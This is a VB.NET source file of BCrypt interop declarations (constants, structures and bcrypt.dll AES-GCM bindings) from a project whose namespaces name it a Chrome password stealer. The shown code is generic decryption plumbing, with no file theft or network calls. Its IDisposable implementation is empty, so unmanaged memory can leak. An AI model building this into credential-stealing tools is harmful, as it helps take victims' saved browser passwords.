Imports System
Imports System.Collections.Generic
Imports System.Text
Imports System.Runtime.InteropServices
Imports PasswordStealer.ChromeRecovery
Imports System.Security.Cryptography

Namespace ChromeRecovery
    Module BCrypt
        Public Const ERROR_SUCCESS As UInteger = &H0
        Public Const BCRYPT_PAD_PSS As UInteger = 8
        Public Const BCRYPT_PAD_OAEP As UInteger = 4
        Public ReadOnly BCRYPT_KEY_DATA_BLOB_MAGIC As Byte() = BitConverter.GetBytes(&H4D42444B)
        Public ReadOnly BCRYPT_OBJECT_LENGTH As String = "ObjectLength"
        Public ReadOnly BCRYPT_CHAIN_MODE_GCM As String = "ChainingModeGCM"
        Public ReadOnly BCRYPT_AUTH_TAG_LENGTH As String = "AuthTagLength"
        Public ReadOnly BCRYPT_CHAINING_MODE As String = "ChainingMode"
        Public ReadOnly BCRYPT_KEY_DATA_BLOB As String = "KeyDataBlob"
        Public ReadOnly BCRYPT_AES_ALGORITHM As String = "AES"
        Public ReadOnly MS_PRIMITIVE_PROVIDER As String = "Microsoft Primitive Provider"
        Public ReadOnly BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG As Integer = &H1
        Public ReadOnly BCRYPT_INIT_AUTH_MODE_INFO_VERSION As Integer = &H1
        Public ReadOnly STATUS_AUTH_TAG_MISMATCH As Integer = &HC000A002

        <StructLayout(LayoutKind.Sequential)>
        Public Structure BCRYPT_PSS_PADDING_INFO
            Public Sub New(ByVal pszAlgId As String, ByVal cbSalt As Integer)
                Me.pszAlgId = pszAlgId
                Me.cbSalt = cbSalt
            End Sub

            <MarshalAs(UnmanagedType.LPWStr)>
            Public pszAlgId As String
            Public cbSalt As Integer
        End Structure

        <StructLayout(LayoutKind.Sequential)>
        Public Structure BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
            Implements System.IDisposable

            Public cbSize As Integer
            Public dwInfoVersion As Integer
            Public pbNonce As IntPtr
            Public cbNonce As Integer
            Public pbAuthData As IntPtr
            Public cbAuthData As Integer
            Public pbTag As IntPtr
            Public cbTag As Integer
            Public pbMacContext As IntPtr
            Public cbMacContext As Integer
            Public cbAAD As Integer
            Public cbData As Long
            Public dwFlags As Integer

            Public Sub New(ByVal iv As Byte(), ByVal aad As Byte(), ByVal tag As Byte())
                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION
                cbSize = Marshal.SizeOf(GetType(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO))

                If iv IsNot Nothing Then
                    cbNonce = iv.Length
                    pbNonce = Marshal.AllocHGlobal(cbNonce)
                    Marshal.Copy(iv, 0, pbNonce, cbNonce)
                End If

                If aad IsNot Nothing Then
                    cbAuthData = aad.Length
                    pbAuthData = Marshal.AllocHGlobal(cbAuthData)
                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData)
                End If

                If tag IsNot Nothing Then
                    cbTag = tag.Length
                    pbTag = Marshal.AllocHGlobal(cbTag)
                    Marshal.Copy(tag, 0, pbTag, cbTag)
                    cbMacContext = tag.Length
                    pbMacContext = Marshal.AllocHGlobal(cbMacContext)
                End If
            End Sub

            Public Sub Dispose()
                If pbNonce <> IntPtr.Zero Then Marshal.FreeHGlobal(pbNonce)
                If pbTag <> IntPtr.Zero Then Marshal.FreeHGlobal(pbTag)
                If pbAuthData <> IntPtr.Zero Then Marshal.FreeHGlobal(pbAuthData)
                If pbMacContext <> IntPtr.Zero Then Marshal.FreeHGlobal(pbMacContext)
            End Sub

            Public Sub Dispose1() Implements IDisposable.Dispose

            End Sub
        End Structure

        <StructLayout(LayoutKind.Sequential)>
        Public Structure BCRYPT_KEY_LENGTHS_STRUCT
            Public dwMinLength As Integer
            Public dwMaxLength As Integer
            Public dwIncrement As Integer
        End Structure

        <StructLayout(LayoutKind.Sequential)>
        Public Structure BCRYPT_OAEP_PADDING_INFO
            Public Sub New(ByVal alg As String)
                pszAlgId = alg
                pbLabel = IntPtr.Zero
                cbLabel = 0
            End Sub

            <MarshalAs(UnmanagedType.LPWStr)>
            Public pszAlgId As String
            Public pbLabel As IntPtr
            Public cbLabel As Integer
        End Structure

        <DllImport("bcrypt.dll")>
        Function BCryptOpenAlgorithmProvider(<Out> ByRef phAlgorithm As IntPtr,
        <MarshalAs(UnmanagedType.LPWStr)> ByVal pszAlgId As String,
        <MarshalAs(UnmanagedType.LPWStr)> ByVal pszImplementation As String, ByVal dwFlags As UInteger) As UInteger
        End Function
        <DllImport("bcrypt.dll")>
        Function BCryptCloseAlgorithmProvider(ByVal hAlgorithm As IntPtr, ByVal flags As UInteger) As UInteger
        End Function
        <DllImport("bcrypt.dll", EntryPoint:="BCryptGetProperty")>
        Function BCryptGetProperty(ByVal hObject As IntPtr,
        <MarshalAs(UnmanagedType.LPWStr)> ByVal pszProperty As String, ByVal pbOutput As Byte(), ByVal cbOutput As Integer, ByRef pcbResult As Integer, ByVal flags As UInteger) As UInteger
        End Function
        <DllImport("bcrypt.dll", EntryPoint:="BCryptSetProperty")>
        Friend Function BCryptSetAlgorithmProperty(ByVal hObject As IntPtr,
        <MarshalAs(UnmanagedType.LPWStr)> ByVal pszProperty As String, ByVal pbInput As Byte(), ByVal cbInput As Integer, ByVal dwFlags As Integer) As UInteger
        End Function
        <DllImport("bcrypt.dll")>
        Function BCryptImportKey(ByVal hAlgorithm As IntPtr, ByVal hImportKey As IntPtr,
        <MarshalAs(UnmanagedType.LPWStr)> ByVal pszBlobType As String, <Out> ByRef phKey As IntPtr, ByVal pbKeyObject As IntPtr, ByVal cbKeyObject As Integer, ByVal pbInput As Byte(), ByVal cbInput As Integer, ByVal dwFlags As UInteger) As UInteger
        End Function
        <DllImport("bcrypt.dll")>
        Function BCryptDestroyKey(ByVal hKey As IntPtr) As UInteger
        End Function
        <DllImport("bcrypt.dll")>
        Function BCryptEncrypt(ByVal hKey As IntPtr, ByVal pbInput As Byte(), ByVal cbInput As Integer, ByRef pPaddingInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, ByVal pbIV As Byte(), ByVal cbIV As Integer, ByVal pbOutput As Byte(), ByVal cbOutput As Integer, ByRef pcbResult As Integer, ByVal dwFlags As UInteger) As UInteger
        End Function
        <DllImport("bcrypt.dll")>
        Friend Function BCryptDecrypt(ByVal hKey As IntPtr, ByVal pbInput As Byte(), ByVal cbInput As Integer, ByRef pPaddingInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, ByVal pbIV As Byte(), ByVal cbIV As Integer, ByVal pbOutput As Byte(), ByVal cbOutput As Integer, ByRef pcbResult As Integer, ByVal dwFlags As Integer) As UInteger
        End Function
    End Module
End Namespace

